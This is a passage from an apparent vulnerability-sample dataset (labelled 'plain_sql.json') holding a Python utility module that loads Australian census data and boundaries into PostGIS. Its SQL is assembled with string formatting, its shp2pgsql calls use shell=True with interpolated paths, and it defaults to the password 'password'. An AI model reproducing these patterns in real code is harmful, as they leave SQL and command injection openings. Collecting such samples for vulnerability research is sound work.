debug=True)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/minus34/census-loader/blob/2f409cbd2eac7aaa87ae7458db3357b54faa0af9",
        "file_path": "/utils.py",
        "source": "import argparse\nimport io\nimport multiprocessing\nimport math\nimport os\nimport platform\nimport psycopg2\nimport subprocess\nimport sys\n\n\n# set the command line arguments for the script\ndef set_arguments():\n    parser = argparse.ArgumentParser(\n        description='A quick way to load the complete GNAF and PSMA Admin Boundaries into Postgres, '\n                    'simplified and ready to use as reference data for geocoding, analysis and visualisation.')\n\n    parser.add_argument(\n        '--max-processes', type=int, default=3,\n        help='Maximum number of parallel processes to use for the data load. (Set it to the number of cores on the '\n             'Postgres server minus 2, limit to 12 if 16+ cores - there is minimal benefit beyond 12). Defaults to 3.')\n\n    # PG Options\n    parser.add_argument(\n        '--pghost',\n        help='Host name for Postgres server. Defaults to PGHOST environment variable if set, otherwise localhost.')\n    parser.add_argument(\n        '--pgport', type=int,\n        help='Port number for Postgres server. Defaults to PGPORT environment variable if set, otherwise 5432.')\n    parser.add_argument(\n        '--pgdb',\n        help='Database name for Postgres server. Defaults to PGDATABASE environment variable if set, '\n             'otherwise utils.')\n    parser.add_argument(\n        '--pguser',\n        help='Username for Postgres server. Defaults to PGUSER environment variable if set, otherwise postgres.')\n    parser.add_argument(\n        '--pgpassword',\n        help='Password for Postgres server. Defaults to PGPASSWORD environment variable if set, '\n             'otherwise \\'password\\'.')\n\n    # schema names for the census data & boundary tables\n    census_year = '2016'\n\n    parser.add_argument(\n        '--census-year', default=census_year,\n        help='Census year as YYYY. Valid values are \\'2011\\' or \\'2016\\'. '\n             'Defaults to last census \\'' + census_year + '\\'.')\n\n    parser.add_argument(\n        '--data-schema', default='census_' + census_year + '_data',\n        help='Schema name to store data tables in. Defaults to \\'census_' + census_year + '_data\\'.')\n    parser.add_argument(\n        '--boundary-schema', default='census_' + census_year + '_bdys',\n        help='Schema name to store raw boundary tables in. Defaults to \\'census_' + census_year + '_bdys\\'.')\n    parser.add_argument(\n        '--web-schema', default='census_' + census_year + '_web',\n        help='Schema name to store web optimised boundary tables in. Defaults to \\'census_' + census_year + '_web\\'.')\n\n    # number of classes of data to map\n    parser.add_argument(\n        '--num-classes', type=int, default=7,\n        help='Number of classes (i.e breaks) shown in each map. Defaults to 7.')\n\n    # directories\n    parser.add_argument(\n        '--census-data-path', required=True,\n        help='Path to source census data tables (*.csv files). '\n             'This directory must be accessible by the Postgres server, and the local path to the directory for the '\n             'server must be set via the local-server-dir argument if it differs from this path.')\n    # parser.add_argument(\n    #     '--local-server-dir',\n    #     help='Local path on server corresponding to census-data-path, if different to census-data-path.')\n    parser.add_argument(\n        '--census-bdys-path', required=True, help='Local path to source admin boundary files.')\n\n    # # states to load\n    # parser.add_argument('--states', nargs='+', choices=[\"ACT\", \"NSW\", \"NT\", \"OT\", \"QLD\", \"SA\", \"TAS\", \"VIC\", \"WA\"],\n    #                     default=[\"ACT\", \"NSW\", \"NT\", \"OT\", \"QLD\", \"SA\", \"TAS\", \"VIC\", \"WA\"],\n    #                     help='List of states to load data for. Defaults to all states.')\n\n    return parser.parse_args()\n\n\n# create the dictionary of settings\ndef get_settings(args):\n    settings = dict()\n\n    settings['max_concurrent_processes'] = args.max_processes\n    settings['census_year'] = args.census_year\n    # settings['states_to_load'] = args.states\n    settings['states'] = [\"ACT\", \"NSW\", \"NT\", \"OT\", \"QLD\", \"SA\", \"TAS\", \"VIC\", \"WA\"]\n    settings['data_schema'] = args.data_schema\n    settings['boundary_schema'] = args.boundary_schema\n    settings['web_schema'] = args.web_schema\n    settings['data_directory'] = args.census_data_path.replace(\"\\\\\", \"/\")\n    # if args.local_server_dir:\n    #     settings['data_pg_server_local_directory'] = args.local_server_dir.replace(\"\\\\\", \"/\")\n    # else:\n    #     settings['data_pg_server_local_directory'] = settings['data_directory']\n    settings['boundaries_local_directory'] = args.census_bdys_path.replace(\"\\\\\", \"/\")\n\n    settings['num_classes'] = args.num_classes\n\n    # create postgres connect string\n    settings['pg_host'] = args.pghost or os.getenv(\"PGHOST\", \"localhost\")\n    settings['pg_port'] = args.pgport or os.getenv(\"PGPORT\", 5432)\n    settings['pg_db'] = args.pgdb or os.getenv(\"PGDATABASE\", \"geo\")\n    settings['pg_user'] = args.pguser or os.getenv(\"PGUSER\", \"postgres\")\n    settings['pg_password'] = args.pgpassword or os.getenv(\"PGPASSWORD\", \"password\")\n\n    settings['pg_connect_string'] = \"dbname='{0}' host='{1}' port='{2}' user='{3}' password='{4}'\".format(\n        settings['pg_db'], settings['pg_host'], settings['pg_port'], settings['pg_user'], settings['pg_password'])\n\n    # set postgres script directory\n    settings['sql_dir'] = os.path.join(os.path.dirname(os.path.realpath(__file__)), \"postgres-scripts\")\n\n    # set file name and field name defaults based on census year\n    if settings['census_year'] == '2016':\n        settings['metadata_file_prefix'] = \"Sample_Metadata_\"\n        settings['metadata_file_type'] = \".xls\"\n        settings[\"census_metadata_dicts\"] = [{\"table\": \"metadata_tables\", \"first_row\": \"table number\"},\n                                             {\"table\": \"metadata_stats\", \"first_row\": \"sequential\"}]\n\n        settings['data_file_prefix'] = \"2016_Sample_\"\n        settings['data_file_type'] = \".csv\"\n        settings['table_name_part'] = 2  # position in the data file name that equals it's destination table name\n        settings['bdy_name_part'] = 3  # position in the data file name that equals it's census boundary name\n        settings['region_id_field'] = \"aus_code_2016\"\n\n        settings['bdy_table_dicts'] = \\\n            [{\"boundary\": \"add\", \"id_field\": \"add_code16\", \"name_field\": \"add_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"ced\", \"id_field\": \"ced_code16\", \"name_field\": \"ced_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"gccsa\", \"id_field\": \"gcc_code16\", \"name_field\": \"gcc_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"iare\", \"id_field\": \"iar_code16\", \"name_field\": \"iar_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"iloc\", \"id_field\": \"ilo_code16\", \"name_field\": \"ilo_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"ireg\", \"id_field\": \"ire_code16\", \"name_field\": \"ire_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"lga\", \"id_field\": \"lga_code16\", \"name_field\": \"lga_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"mb\", \"id_field\": \"mb_code16\", \"name_field\": \"'MB ' || mb_code16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"nrmr\", \"id_field\": \"nrm_code16\", \"name_field\": \"nrm_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"poa\", \"id_field\": \"poa_code16\", \"name_field\": \"'Postcode ' || poa_name16\", \"area_field\": \"areasqkm16\"},\n             # {\"boundary\": \"ra\", \"id_field\": \"ra_code16\", \"name_field\": \"ra_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"sa1\", \"id_field\": \"sa1_main16\", \"name_field\": \"'SA1 ' || sa1_main16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"sa2\", \"id_field\": \"sa2_main16\", \"name_field\": \"sa2_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"sa3\", \"id_field\": \"sa3_code16\", \"name_field\": \"sa3_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"sa4\", \"id_field\": \"sa4_code16\", \"name_field\": \"sa4_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"sed\", \"id_field\": \"sed_code16\", \"name_field\": \"sed_name16\", \"area_field\": \"areasqkm16\"},\n             # {\"boundary\": \"sla\", \"id_field\": \"sla_main\", \"name_field\": \"sla_name16\", \"area_field\": \"areasqkm16\"},\n             # {\"boundary\": \"sos\", \"id_field\": \"sos_code16\", \"name_field\": \"sos_name16\", \"area_field\": \"areasqkm16\"},\n             # {\"boundary\": \"sosr\", \"id_field\": \"sosr_code16\", \"name_field\": \"sosr_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"ssc\", \"id_field\": \"ssc_code16\", \"name_field\": \"ssc_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"ste\", \"id_field\": \"state_code16\", \"name_field\": \"state_name16\", \"area_field\": \"areasqkm16\"},\n             # {\"boundary\": \"sua\", \"id_field\": \"sua_code16\", \"name_field\": \"sua_name16\", \"area_field\": \"areasqkm16\"},\n             {\"boundary\": \"tr\", \"id_field\": \"tr_code16\", \"name_field\": \"tr_name16\", \"area_field\": \"areasqkm16\"}]\n    # {\"boundary\": \"ucl\", \"id_field\": \"ucl_code16\", \"name_field\": \"ucl_name16\", \"area_field\": \"areasqkm16\"}]\n\n    elif settings['census_year'] == '2011':\n        settings['metadata_file_prefix'] = \"Metadata_\"\n        settings['metadata_file_type'] = \".xlsx\"\n        settings[\"census_metadata_dicts\"] = [{\"table\": \"metadata_tables\", \"first_row\": \"table number\"},\n                                             {\"table\": \"metadata_stats\", \"first_row\": \"sequential\"}]\n\n        settings['data_file_prefix'] = \"2011Census_\"\n        settings['data_file_type'] = \".csv\"\n        settings['table_name_part'] = 1  # position in the data file name that equals it's destination table name\n        settings['bdy_name_part'] = 3  # position in the data file name that equals it's census boundary name\n        settings['region_id_field'] = \"region_id\"\n\n        settings['bdy_table_dicts'] = \\\n            [{\"boundary\": \"ced\", \"id_field\": \"ced_code\", \"name_field\": \"ced_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"gccsa\", \"id_field\": \"gccsa_code\", \"name_field\": \"gccsa_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"iare\", \"id_field\": \"iare_code\", \"name_field\": \"iare_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"iloc\", \"id_field\": \"iloc_code\", \"name_field\": \"iloc_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"ireg\", \"id_field\": \"ireg_code\", \"name_field\": \"ireg_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"lga\", \"id_field\": \"lga_code\", \"name_field\": \"lga_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"mb\", \"id_field\": \"mb_code11\", \"name_field\": \"'MB ' || mb_code11\", \"area_field\": \"albers_sqm / 1000000.0\"},\n             {\"boundary\": \"poa\", \"id_field\": \"poa_code\", \"name_field\": \"'POA ' || poa_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"ra\", \"id_field\": \"ra_code\", \"name_field\": \"ra_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"sa1\", \"id_field\": \"sa1_7digit\", \"name_field\": \"'SA1 ' || sa1_7digit\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"sa2\", \"id_field\": \"sa2_main\", \"name_field\": \"sa2_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"sa3\", \"id_field\": \"sa3_code\", \"name_field\": \"sa3_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"sa4\", \"id_field\": \"sa4_code\", \"name_field\": \"sa4_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"sed\", \"id_field\": \"sed_code\", \"name_field\": \"sed_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"sla\", \"id_field\": \"sla_main\", \"name_field\": \"sla_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"sos\", \"id_field\": \"sos_code\", \"name_field\": \"sos_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"sosr\", \"id_field\": \"sosr_code\", \"name_field\": \"sosr_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"ssc\", \"id_field\": \"ssc_code\", \"name_field\": \"ssc_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"ste\", \"id_field\": \"state_code\", \"name_field\": \"state_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"sua\", \"id_field\": \"sua_code\", \"name_field\": \"sua_name\", \"area_field\": \"area_sqkm\"},\n             {\"boundary\": \"ucl\", \"id_field\": \"ucl_code\", \"name_field\": \"ucl_name\", \"area_field\": \"area_sqkm\"}]\n    else:\n        return None\n\n    return settings\n\n\n# get the boundary name that suits each (tiled map) zoom level\ndef get_boundary_name(zoom_level):\n\n    # if zoom_level < 7:\n    #     boundary_name = \"ste\"\n    if zoom_level < 7:\n        boundary_name = \"ste\"\n    elif zoom_level < 9:\n        boundary_name = \"sa4\"\n    elif zoom_level < 11:\n        boundary_name = \"sa3\"\n    elif zoom_level < 14:\n        boundary_name = \"sa2\"\n    elif zoom_level < 17:\n        boundary_name = \"sa1\"\n    else:\n        boundary_name = \"mb\"\n\n    return boundary_name\n\n\n# calculates the area tolerance (in m2) for vector simplification using the Visvalingam-Whyatt algorithm\ndef get_tolerance(zoom_level):\n\n    # pixels squared factor\n    tolerance_square_pixels = 7\n\n    # default Google/Bing map tile scales\n    metres_per_pixel = 156543.03390625 / math.pow(2.0, float(zoom_level + 1))\n\n    # the tolerance (metres) for vector simplification using the VW algorithm\n    square_metres_per_pixel = math.pow(metres_per_pixel, 2.0)\n\n    # # rough metres to degrees conversation, using spherical WGS84 datum radius for simplicity and speed\n    # metres2degrees = (2.0 * math.pi * 6378137.0) / 360.0\n\n    # # the tolerance for thinning data and limiting decimal places in GeoJSON responses\n    # degrees_per_pixel = metres_per_pixel / metres2degrees\n\n    # # the tolerance (degrees) for vector simplification using the VW algorithm\n    # square_degrees_per_pixel = math.pow(degrees_per_pixel, 2.0)\n\n    # tolerance to use\n    # tolerance = square_degrees_per_pixel * tolerance_square_pixels\n    tolerance = square_metres_per_pixel * tolerance_square_pixels\n\n    return tolerance\n\n\n# maximum number of decimal places for boundary coordinates - improves display performance\ndef get_decimal_places(zoom_level):\n\n    # rough metres to degrees conversation, using spherical WGS84 datum radius for simplicity and speed\n    metres2degrees = (2.0 * math.pi * 6378137.0) / 360.0\n\n    # default Google/Bing map tile scales\n    metres_per_pixel = 156543.03390625 / math.pow(2.0, float(zoom_level))\n\n    # the tolerance for thinning data and limiting decimal places in GeoJSON responses\n    degrees_per_pixel = metres_per_pixel / metres2degrees\n\n    scale_string = \"{:10.9f}\".format(degrees_per_pixel).split(\".\")[1]\n    places = 1\n\n    trigger = \"0\"\n\n    # find how many zero decimal places there are. e.g. 0.00001234 = 4 zeros\n    for c in scale_string:\n        if c == trigger:\n            places += 1\n        else:\n            trigger = \"don't do anything else\"  # used to cleanly exit the loop\n\n    return places\n\n\ndef get_kmeans_bins(data_table, boundary_table, stat_field, pg_cur, settings):\n\n    sql = \"WITH sub AS (\" \\\n          \"WITH points AS (\" \\\n          \"SELECT {0} as val, ST_MakePoint({0}, 0) AS pnt FROM {1} AS tab \" \\\n          \"INNER JOIN {2} AS bdy ON tab.{3} = bdy.id) \" \\\n          \"SELECT val, ST_ClusterKMeans(pnt, {4}) OVER () AS cluster_id FROM points) \" \\\n          \"SELECT MAX(val) AS val FROM sub GROUP BY cluster_id ORDER BY val\" \\\n        .format(stat_field, data_table, boundary_table, settings['region_id_field'], settings['num_classes'])\n\n    print(sql)\n\n    try:\n        pg_cur.execute(sql)\n        rows = pg_cur.fetchall()\n\n    except Exception as ex:\n        print(\"{0} - {1} Failed: {2}\".format(data_table, stat_field, ex))\n        return list()\n\n    # census_2011_data.ced_b23a - b4318\n\n    output_list = list()\n\n    for row in rows:\n        output_list.append(row[\"val\"])\n\n    return output_list\n\n\ndef get_equal_interval_bins(data_table, boundary_table, stat_field, pg_cur, settings):\n\n    sql = \"SELECT MIN({0}) AS min, MAX({0}) AS max FROM {1}  AS tab \" \\\n          \"INNER JOIN {2} AS bdy ON tab.{3} = bdy.id \" \\\n          \"WHERE {0} > 0 AND {0} < 100.0\"\\\n        .format(stat_field, data_table, boundary_table, settings['region_id_field'])\n\n    try:\n        pg_cur.execute(sql)\n        row = pg_cur.fetchone()\n\n    except Exception as ex:\n        print(\"{0} - {1} Failed: {2}\".format(data_table, stat_field, ex))\n        return list()\n\n    output_list = list()\n\n    min = row[\"min\"]\n    max = row[\"max\"]\n    delta = (max - min) / float(settings[\"num_classes\"])\n    currVal = min\n\n    # print(\"{0} : from {1} to {2}\".format(boundary_table, min, max))\n\n    for i in range(0, settings[\"num_classes\"]):\n        output_list.append(currVal)\n        currVal += delta\n\n    return output_list\n\n\n# takes a list of sql queries or command lines and runs them using multiprocessing\ndef multiprocess_csv_import(work_list, settings, logger):\n    pool = multiprocessing.Pool(processes=settings['max_concurrent_processes'])\n\n    num_jobs = len(work_list)\n\n    results = pool.imap_unordered(run_csv_import_multiprocessing, [[w, settings] for w in work_list])\n\n    pool.close()\n    pool.join()\n\n    result_list = list(results)\n    num_results = len(result_list)\n\n    if num_jobs > num_results:\n        logger.warning(\"\\t- A MULTIPROCESSING PROCESS FAILED WITHOUT AN ERROR\\nACTION: Check the record counts\")\n\n    for result in result_list:\n        if result != \"SUCCESS\":\n            logger.info(result)\n\n\ndef run_csv_import_multiprocessing(args):\n    file_dict = args[0]\n    settings = args[1]\n\n    pg_conn = psycopg2.connect(settings['pg_connect_string'])\n    pg_conn.autocommit = True\n    pg_cur = pg_conn.cursor()\n\n    # CREATE TABLE\n\n    # get the census fields for the table\n    field_list = list()\n\n    # sql = \"SELECT sequential_id || ' ' || stat_type AS field \" \\\n    #       \"FROM {0}.metadata_stats \" \\\n    #       \"WHERE lower(table_number) LIKE '{1}%'\" \\\n    #     .format(settings['data_schema'], table_number)\n    sql = \"SELECT sequential_id || ' double precision' AS field \" \\\n          \"FROM {0}.metadata_stats \" \\\n          \"WHERE lower(table_number) LIKE '{1}%'\" \\\n        .format(settings['data_schema'], file_dict[\"table\"])\n    pg_cur.execute(sql)\n\n    fields = pg_cur.fetchall()\n\n    for field in fields:\n        field_list.append(field[0].lower())\n\n    fields_string = \",\".join(field_list)\n\n    # create the table\n    table_name = file_dict[\"boundary\"] + \"_\" + file_dict[\"table\"]\n\n    create_table_sql = \"DROP TABLE IF EXISTS {0}.{1} CASCADE;\" \\\n                       \"CREATE TABLE {0}.{1} ({4} text, {2}) WITH (OIDS=FALSE);\" \\\n                       \"ALTER TABLE {0}.metadata_tables OWNER TO {3}\" \\\n        .format(settings['data_schema'], table_name, fields_string,\n                settings['pg_user'], settings['region_id_field'])\n\n    pg_cur.execute(create_table_sql)\n\n    # IMPORT CSV FILE\n\n    try:\n        # read CSV into a string\n        raw_string = open(file_dict[\"path\"], 'r').read()\n\n        # clean whitespace and non-ascii characters\n        clean_string = raw_string.lstrip().rstrip().replace(\" \", \"\").replace(\"\\x1A\", \"\")\n\n        # convert to in memory stream\n        csv_file = io.StringIO(clean_string)\n        csv_file.seek(0)  # move position back to beginning of file before reading\n\n        # import into Postgres\n        sql = \"COPY {0}.{1} FROM stdin WITH CSV HEADER DELIMITER as ',' NULL as '..'\"\\\n            .format(settings['data_schema'], table_name)\n        pg_cur.copy_expert(sql, csv_file)\n\n    except Exception as ex:\n        return \"IMPORT CSV INTO POSTGRES FAILED! : {0} : {1}\".format(file_dict[\"path\"], ex)\n\n    # add primary key and vacuum index\n    sql = \"ALTER TABLE {0}.{1} ADD CONSTRAINT {1}_pkey PRIMARY KEY ({2});\" \\\n          \"ALTER TABLE {0}.{1} CLUSTER ON {1}_pkey\" \\\n        .format(settings['data_schema'], table_name, settings['region_id_field'])\n    pg_cur.execute(sql)\n\n    pg_cur.execute(\"VACUUM ANALYSE {0}.{1}\".format(settings['data_schema'], table_name))\n\n    result = \"SUCCESS\"\n\n    pg_cur.close()\n    pg_conn.close()\n\n    return result\n\n\n# takes a list of sql queries or command lines and runs them using multiprocessing\ndef multiprocess_list(mp_type, work_list, settings, logger):\n    pool = multiprocessing.Pool(processes=settings['max_concurrent_processes'])\n\n    num_jobs = len(work_list)\n\n    if mp_type == \"sql\":\n        results = pool.imap_unordered(run_sql_multiprocessing, [[w, settings] for w in work_list])\n    else:\n        results = pool.imap_unordered(run_command_line, work_list)\n\n    pool.close()\n    pool.join()\n\n    result_list = list(results)\n    num_results = len(result_list)\n\n    if num_jobs > num_results:\n        logger.warning(\"\\t- A MULTIPROCESSING PROCESS FAILED WITHOUT AN ERROR\\nACTION: Check the record counts\")\n\n    for result in result_list:\n        if result != \"SUCCESS\":\n            logger.info(result)\n\n\ndef run_sql_multiprocessing(args):\n    the_sql = args[0]\n    settings = args[1]\n    pg_conn = psycopg2.connect(settings['pg_connect_string'])\n    pg_conn.autocommit = True\n    pg_cur = pg_conn.cursor()\n\n    # # set raw gnaf database schema (it's needed for the primary and foreign key creation)\n    # if settings['raw_gnaf_schema'] != \"public\":\n    #     pg_cur.execute(\"SET search_path = {0}, public, pg_catalog\".format(settings['raw_gnaf_schema'],))\n\n    try:\n        pg_cur.execute(the_sql)\n        result = \"SUCCESS\"\n    except Exception as ex:\n        result = \"SQL FAILED! : {0} : {1}\".format(the_sql, ex)\n\n    pg_cur.close()\n    pg_conn.close()\n\n    return result\n\n\ndef run_command_line(cmd):\n    # run the command line without any output (it'll still tell you if it fails miserably)\n    try:\n        fnull = open(os.devnull, \"w\")\n        subprocess.call(cmd, shell=True, stdout=fnull, stderr=subprocess.STDOUT)\n        result = \"SUCCESS\"\n    except Exception as ex:\n        result = \"COMMAND FAILED! : {0} : {1}\".format(cmd, ex)\n\n    return result\n\n\n# def open_sql_file(file_name, settings):\n#     sql = open(os.path.join(settings['sql_dir'], file_name), \"r\").read()\n#     return prep_sql(sql, settings)\n#\n#\n# # change schema names in an array of SQL script if schemas not the default\n# def prep_sql_list(sql_list, settings):\n#     output_list = []\n#     for sql in sql_list:\n#         output_list.append(prep_sql(sql, settings))\n#     return output_list\n\n\n# # set schema names in the SQL script\n# def prep_sql(sql, settings):\n#\n#     if settings['raw_gnaf_schema'] is not None:\n#         sql = sql.replace(\" raw_gnaf.\", \" {0}.\".format(settings['raw_gnaf_schema'], ))\n#     if settings['raw_admin_bdys_schema'] is not None:\n#         sql = sql.replace(\" raw_admin_bdys.\", \" {0}.\".format(settings['raw_admin_bdys_schema'], ))\n#     if settings['gnaf_schema'] is not None:\n#         sql = sql.replace(\" gnaf.\", \" {0}.\".format(settings['gnaf_schema'], ))\n#     if settings['admin_bdys_schema'] is not None:\n#         sql = sql.replace(\" admin_bdys.\", \" {0}.\".format(settings['admin_bdys_schema'], ))\n#\n#     if settings['pg_user'] != \"postgres\":\n#         # alter create table script to run with correct Postgres user name\n#         sql = sql.replace(\" postgres;\", \" {0};\".format(settings['pg_user'], ))\n#\n#     return sql\n\n\ndef split_sql_into_list(pg_cur, the_sql, table_schema, table_name, table_alias, table_gid, settings, logger):\n    # get min max gid values from the table to split\n    min_max_sql = \"SELECT MIN({2}) AS min, MAX({2}) AS max FROM {0}.{1}\".format(table_schema, table_name, table_gid)\n\n    pg_cur.execute(min_max_sql)\n\n    try:\n        result = pg_cur.fetchone()\n\n        min_pkey = int(result[0])\n        max_pkey = int(result[1])\n        diff = max_pkey - min_pkey\n\n        # Number of records in each query\n        rows_per_request = int(math.floor(float(diff) / float(settings['max_concurrent_processes']))) + 1\n\n        # If less records than processes or rows per request,\n        # reduce both to allow for a minimum of 15 records each process\n        if float(diff) / float(settings['max_concurrent_processes']) < 10.0:\n            rows_per_request = 10\n            processes = int(math.floor(float(diff) / 10.0)) + 1\n            logger.info(\"\\t\\t- running {0} processes (adjusted due to low row count in table to split)\"\n                        .format(processes))\n        else:\n            processes = settings['max_concurrent_processes']\n\n        # create list of sql statements to run with multiprocessing\n        sql_list = []\n        start_pkey = min_pkey - 1\n\n        for i in range(0, processes):\n            end_pkey = start_pkey + rows_per_request\n\n            where_clause = \" WHERE {0}.{3} > {1} AND {0}.{3} <= {2}\"\\\n                .format(table_alias, start_pkey, end_pkey, table_gid)\n\n            if \"WHERE \" in the_sql:\n                mp_sql = the_sql.replace(\" WHERE \", where_clause + \" AND \")\n            elif \"GROUP BY \" in the_sql:\n                mp_sql = the_sql.replace(\"GROUP BY \", where_clause + \" GROUP BY \")\n            elif \"ORDER BY \" in the_sql:\n                mp_sql = the_sql.replace(\"ORDER BY \", where_clause + \" ORDER BY \")\n            else:\n                if \";\" in the_sql:\n                    mp_sql = the_sql.replace(\";\", where_clause + \";\")\n                else:\n                    mp_sql = the_sql + where_clause\n                    logger.warning(\"\\t\\t- NOTICE: no ; found at the end of the SQL statement\")\n\n            sql_list.append(mp_sql)\n            start_pkey = end_pkey\n\n        # logger.info('\\n'.join(sql_list))\n\n        return sql_list\n    except Exception as ex:\n        logger.fatal(\"Looks like the table in this query is empty: {0}\\n{1}\".format(min_max_sql, ex))\n        return None\n\n\ndef check_python_version(logger):\n    # get python and psycopg2 version\n    python_version = sys.version.split(\"(\")[0].strip()\n    psycopg2_version = psycopg2.__version__.split(\"(\")[0].strip()\n    os_version = platform.system() + \" \" + platform.version().strip()\n\n    # logger.info(\"\")\n    logger.info(\"\\t- running Python {0} with Psycopg2 {1}\"\n                .format(python_version, psycopg2_version))\n    logger.info(\"\\t- on {0}\".format(os_version))\n\n\ndef check_postgis_version(pg_cur, settings, logger):\n    # get Postgres, PostGIS & GEOS versions\n    pg_cur.execute(\"SELECT version()\")\n    pg_version = pg_cur.fetchone()[0].replace(\"PostgreSQL \", \"\").split(\",\")[0]\n    pg_cur.execute(\"SELECT PostGIS_full_version()\")\n    lib_strings = pg_cur.fetchone()[0].replace(\"\\\"\", \"\").split(\" \")\n    postgis_version = \"UNKNOWN\"\n    postgis_version_num = 0.0\n    geos_version = \"UNKNOWN\"\n    geos_version_num = 0.0\n    settings['st_clusterkmeans_supported'] = False\n    for lib_string in lib_strings:\n        if lib_string[:8] == \"POSTGIS=\":\n            postgis_version = lib_string.replace(\"POSTGIS=\", \"\")\n            postgis_version_num = float(postgis_version[:3])\n        if lib_string[:5] == \"GEOS=\":\n            geos_version = lib_string.replace(\"GEOS=\", \"\")\n            geos_version_num = float(geos_version[:3])\n    if postgis_version_num >= 2.2 and geos_version_num >= 3.5:\n        settings['st_clusterkmeans_supported'] = True\n    logger.info(\"\\t- using Postgres {0} and PostGIS {1} (with GEOS {2})\"\n                .format(pg_version, postgis_version, geos_version))\n\n\ndef multiprocess_shapefile_load(work_list, settings, logger):\n    pool = multiprocessing.Pool(processes=settings['max_concurrent_processes'])\n\n    num_jobs = len(work_list)\n\n    results = pool.imap_unordered(intermediate_shapefile_load_step, [[w, settings] for w in work_list])\n\n    pool.close()\n    pool.join()\n\n    result_list = list(results)\n    num_results = len(result_list)\n\n    if num_jobs > num_results:\n        logger.warning(\"\\t- A MULTIPROCESSING PROCESS FAILED WITHOUT AN ERROR\\nACTION: Check the record counts\")\n\n    for result in result_list:\n        if result != \"SUCCESS\":\n            logger.info(result)\n\n\ndef intermediate_shapefile_load_step(args):\n    work_dict = args[0]\n    settings = args[1]\n    # logger = args[2]\n\n    file_path = work_dict['file_path']\n    pg_table = work_dict['pg_table']\n    pg_schema = work_dict['pg_schema']\n    delete_table = work_dict['delete_table']\n    spatial = work_dict['spatial']\n\n    pg_conn = psycopg2.connect(settings['pg_connect_string'])\n    pg_conn.autocommit = True\n    pg_cur = pg_conn.cursor()\n\n    result = import_shapefile_to_postgres(pg_cur, file_path, pg_table, pg_schema, delete_table, spatial)\n\n    return result\n\n\n# imports a Shapefile into Postgres in 2 steps: SHP > SQL; SQL > Postgres\n# overcomes issues trying to use psql with PGPASSWORD set at runtime\ndef import_shapefile_to_postgres(pg_cur, file_path, pg_table, pg_schema, delete_table, spatial):\n\n    # delete target table or append to it?\n    if delete_table:\n        delete_append_flag = \"-d\"\n    else:\n        delete_append_flag = \"-a\"\n\n    # assign coordinate system if spatial, otherwise flag as non-spatial\n    if spatial:\n        spatial_or_dbf_flags = \"-s 4283 -I\"\n    else:\n        spatial_or_dbf_flags = \"-G -n\"\n\n    # build shp2pgsql command line\n    shp2pgsql_cmd = \"shp2pgsql {0} {1} -i \\\"{2}\\\" {3}.{4}\"\\\n        .format(delete_append_flag, spatial_or_dbf_flags, file_path, pg_schema, pg_table)\n    # print(shp2pgsql_cmd)\n\n    # convert the Shapefile to SQL statements\n    try:\n        process = subprocess.Popen(shp2pgsql_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n        sql_obj, err = process.communicate()\n    except:\n        return \"Importing {0} - Couldn't convert Shapefile to SQL\".format(file_path)\n\n    # prep Shapefile SQL\n    sql = sql_obj.decode(\"utf-8\")  # this is required for Python 3\n    sql = sql.replace(\"Shapefile type: \", \"-- Shapefile type: \")\n    sql = sql.replace(\"Postgis type: \", \"-- Postgis type: \")\n    sql = sql.replace(\"SELECT DropGeometryColumn\", \"-- SELECT DropGeometryColumn\")\n\n    # bug in shp2pgsql? - an append command will still create a spatial index if requested - disable it\n    if not delete_table or not spatial:\n        sql = sql.replace(\"CREATE INDEX \", \"-- CREATE INDEX \")\n\n    # this is required due to differing approaches by different versions of PostGIS\n    sql = sql.replace(\"DROP TABLE \", \"DROP TABLE IF EXISTS \")\n    sql = sql.replace(\"DROP TABLE IF EXISTS IF EXISTS \", \"DROP TABLE IF EXISTS \")\n\n    # import data to Postgres\n    try:\n        pg_cur.execute(sql)\n    except:\n        # if import fails for some reason - output sql to file for debugging\n        target = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), 'test.sql'), \"w\")\n        target.write(sql)\n\n        return \"\\tImporting {0} - Couldn't run Shapefile SQL\\nshp2pgsql result was: {1} \".format(file_path, err)\n\n    # Cluster table on spatial index for performance\n    if delete_table and spatial:\n        sql = \"ALTER TABLE {0}.{1} CLUSTER ON {1}_geom_idx\".format(pg_schema, pg_table)\n\n        try:\n            pg_cur.execute(sql)\n    